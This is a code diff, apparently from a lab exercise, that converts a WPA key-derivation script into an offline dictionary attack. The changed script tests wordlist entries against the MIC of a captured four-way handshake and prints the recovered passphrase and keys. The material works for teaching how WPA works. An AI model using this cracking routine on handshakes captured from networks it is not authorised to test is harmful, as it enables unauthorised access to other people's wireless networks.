@@ -67,7 +67,7 @@ apMac = wpa[handshake].addr2.replace(":", "")
 clientMac = wpa[handshake].addr1.replace(":", "")
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
+#passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 ssid        = aR.info.decode()
 
@@ -106,19 +106,25 @@ print ("Modified version with automatic values retrieval")
 print("\n*************************************")
 print ("\n\nValues used to derivate keys")
 print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
+#print ("Passphrase: ",passPhrase,"\n")
 print ("SSID: ",ssid,"\n")
 print ("AP Mac: ",b2a_hex(APmac),"\n")
 print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
 print ("AP Nonce: ",b2a_hex(ANonce),"\n")
 print ("Client Nonce: ",b2a_hex(SNonce),"\n")
 
-for w in wordlist.readlines():
+ssid = str.encode(ssid)
 
+mic_to_test = Dot11Elt(wpa[handshake + 3]).load[129:-2].hex()
+
+print("Trying each word in the wordlist....")
+
+for w in wordlist.readlines():
+    w = w.strip()
     
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     passPhrase = str.encode(w)
-    ssid = str.encode(ssid)
+    
     pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
     #expand pmk to obtain PTK
@@ -128,16 +134,20 @@ for w in wordlist.readlines():
     #mic = hmac.new(ptk[0:16],data,hashlib.sha1)
     mic = hmac.new(ptk[0:16],wpa_data,hashlib.sha1)
     
-    if mic == message_integrity_check :
+    if bytes(mic.hexdigest()[:-8], 'ascii') == message_integrity_check:
+        print ("=============================")
+        print("Password found: ", w)
+        print ("=============================")
+        print ("\nResults of the key expansion")
+        print ("=============================")
+        print ("PMK:\t\t",pmk.hex(),"\n")
+        print ("PTK:\t\t",ptk.hex(),"\n")
+        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
+        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
+        print ("TK:\t\t",ptk[32:48].hex(),"\n")
+        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
+        print ("MIC:\t\t",mic.hexdigest(),"\n")
         break
 
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
+
